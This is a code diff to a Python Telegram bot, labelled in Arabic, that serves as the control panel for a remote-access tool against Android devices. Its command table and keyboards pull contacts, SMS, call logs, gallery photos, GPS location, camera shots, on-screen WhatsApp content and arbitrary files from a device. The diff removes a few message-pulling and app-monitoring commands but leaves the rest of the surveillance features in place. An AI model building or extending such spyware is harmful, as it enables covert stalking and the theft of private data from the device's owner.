@@ -205,7 +205,7 @@ CATEGORIES = {
     "control":        {"label": "🎮 أدوات تحكم",       "emoji": "🎮"},
     "advanced":       {"label": "⚡ أوامر متقدمة",     "emoji": "⚡"},
     "info":           {"label": "ℹ️ معلومات",          "emoji": "ℹ️"},
-    "app_monitoring": {"label": "📱 مراقبة التطبيقات", "emoji": "📱"},
+    # ⚠️ app_monitoring تمت إزالته
     "permissions": {"label": "🔓 الأذونات", "emoji": "🔓"},
 }
 
@@ -216,10 +216,10 @@ COMMANDS = {
     "calls":          {"category": "data",   "label": "📞 سجل المكالمات",    "description": "سحب سجل المكالمات",       "needs_param": False},
     "apps":           {"category": "data",   "label": "📱 التطبيقات",        "description": "سحب التطبيقات المثبتة",    "needs_param": False},
     "gallery":        {"category": "data",   "label": "🖼 المعرض",            "description": "سحب صور المعرض",          "needs_param": False},
-    "gmail":          {"category": "data",   "label": "📧 Gmail",            "description": "إشعارات Gmail",           "needs_param": False},
-    "whatsapp-messages": {"category": "data", "label": "💬 واتساب",        "description": "سحب رسائل الواتساب",      "needs_param": False},
+    # ⚠️ gmail تمت إزالته — يحتاج Notification Access
+    # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
     "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
-    "telegram-messages": {"category": "data", "label": "✈️ تيليجرام",      "description": "سحب رسائل تيليجرام",      "needs_param": False},
+    # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
     "main-camera":    {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
@@ -253,13 +253,7 @@ COMMANDS = {
     "media-audio":     {"category": "info", "label": "🎵 الصوتيات",       "description": "عرض كل الملفات الصوتية", "needs_param": False},
     "download-media":  {"category": "info", "label": "📥 تحميل وسائط",     "description": "تحميل ملف وسائط",    "needs_param": True, "param_hint": "content://..."},
     "download-file":   {"category": "info", "label": "📥 تحميل ملف",      "description": "تحميل ملف من الجهاز", "needs_param": True, "param_hint": "/sdcard/file.txt"},
-    # app_monitoring
-    "app-monitor-start":  {"category": "app_monitoring", "label": "🟢 تفعيل المراقبة", "description": "بدء مراقبة التطبيقات",     "needs_param": False},
-    "app-monitor-stop":   {"category": "app_monitoring", "label": "🔴 إيقاف المراقبة", "description": "إيقاف مراقبة التطبيقات",   "needs_param": False},
-    "app-usage-report":   {"category": "app_monitoring", "label": "📊 تقرير الاستخدام",       "description": "تقرير استخدام التطبيقات",   "needs_param": False},
-    "app-notifications":  {"category": "app_monitoring", "label": "🔔 الإشعارات",      "description": "مراقبة إشعارات التطبيقات",  "needs_param": False},
-    "running-apps":       {"category": "app_monitoring", "label": "📱 التطبيقات النشطة",      "description": "التطبيقات قيد التشغيل",     "needs_param": False},
-    "kill-app":           {"category": "app_monitoring", "label": "❌ إيقاف تطبيق",           "description": "إيقاف تطبيق محدد",          "needs_param": True, "param_hint": "com.app.name"},
+    # ⚠️ app_monitoring تمت إزالته
 }
 
 def get_commands_by_category(cat):
@@ -386,7 +380,7 @@ def control_panel_keyboard(did, banned=False):
         InlineKeyboardButton("ℹ️ معلومات", callback_data=_cb(did,"kb","info"))
     )
     # Section 4: App Monitoring & Permissions (full width)
-    kb.add(InlineKeyboardButton("📱 مراقبة التطبيقات", callback_data=_cb(did,"kb","app_monitoring")))
+    # ⚠️ مراقبة التطبيقات تمت إزالته من اللوحة
     kb.add(InlineKeyboardButton("🔓 الأذونات", callback_data=_cb(did,"kb","permissions")))
     # Section 5: Device Management (separate section)
     kb.add(
@@ -411,9 +405,10 @@ def data_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"contacts"), _cbtn(did,"all-sms"))
     kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
-    kb.add(_cbtn(did,"gallery"), _cbtn(did,"gmail"))
-    kb.add(_cbtn(did,"whatsapp-messages"), _cbtn(did,"whatsapp-live"))
-    kb.add(_cbtn(did,"telegram-messages"))
+    kb.add(_cbtn(did,"gallery"))
+    # ⚠️ gmail تمت إزالته
+    kb.add(_cbtn(did,"whatsapp-live"))
+    # ⚠️ telegram-messages تمت إزالته
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
     return kb
@@ -489,22 +484,16 @@ def info_keyboard(did):
     return kb
 
 # ── App Monitoring Keyboard ──
-def app_monitoring_keyboard(did):
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(_cbtn(did,"app-monitor-start"), _cbtn(did,"app-monitor-stop"))
-    kb.add(_cbtn(did,"app-usage-report"), _cbtn(did,"app-notifications"))
-    kb.add(_cbtn(did,"running-apps"), _cbtn(did,"kill-app"))
-    kb.add(_back(did))
-    return kb
+# ⚠️ app_monitoring_keyboard تمت إزالته
 
 _KB = {"control_panel": control_panel_keyboard, "data": data_keyboard, "camera": camera_keyboard,
        "audio": audio_keyboard, "tools": tools_keyboard, "advanced": advanced_keyboard,
-       "info": info_keyboard, "app_monitoring": app_monitoring_keyboard,
+       "info": info_keyboard,
        "permissions": permissions_keyboard}
 
 _KB_TITLE = {"control_panel": "⚙ لوحة التحكم", "data": "📦 سحب بيانات", "camera": "📷 كاميرا وشاشة",
              "audio": "🎤 صوت", "tools": "🎮 أدوات تحكم", "advanced": "⚡ أوامر متقدمة",
-             "info": "ℹ️ معلومات", "app_monitoring": "📱 مراقبة التطبيقات",
+             "info": "ℹ️ معلومات",
              "permissions": "🔓 الأذونات"}
 
 
